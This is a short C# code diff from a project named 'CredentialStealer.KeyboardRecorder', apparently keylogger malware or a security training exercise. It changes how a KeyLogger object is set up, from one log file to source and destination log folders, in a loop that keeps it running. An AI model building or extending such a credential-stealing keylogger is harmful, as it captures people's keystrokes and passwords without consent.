@@ -12,7 +12,7 @@ namespace CredentialStealer.KeyboardRecorder
     {
         static void Main(string[] args)
         {
-            KeyLogger kl = new KeyLogger("C:\\ITC\\keylogging.txt");
+            KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\logsrc", @"C:\ITC\logdest");
             while (true)
             {
                 Application.DoEvents();
